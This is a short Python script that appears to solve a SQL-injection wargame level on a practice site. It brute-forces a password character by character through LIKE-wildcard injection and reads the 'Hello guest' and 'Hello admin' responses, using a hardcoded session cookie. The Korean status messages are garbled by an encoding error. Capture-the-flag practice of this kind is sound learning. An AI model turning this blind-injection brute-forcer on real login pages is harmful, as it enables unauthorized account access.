import requests

url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
cookie = "spin7uv9vl2fjnjet0tsug5eb6"
head = {"PHPSESSID":f"{cookie}"}

guest = ""
admin = ""
finish = False

print("π Brute Forceλ₯Ό μμν©λλ€")

for len in range(1, 30):
    if (finish==True):
        break
    print(f"{len}λ²μ§Έ λ¬Έμμ λν΄ κ²μμ€μλλ€..")
    for ran in range(48, 127):
        search = guest+chr(ran)
        param = f"?pw={search}%"
        my_url=url+param
        res=requests.get(my_url, cookies=head)
        if ("Hello admin" in res.text):
            admin = search+"%"
            print(f"π μ μ ν κ²μμ΄λ {admin}μλλ€!")
            finish = True
            break
        elif ("Hello guest" in res.text):
            guest += chr(ran)
            break
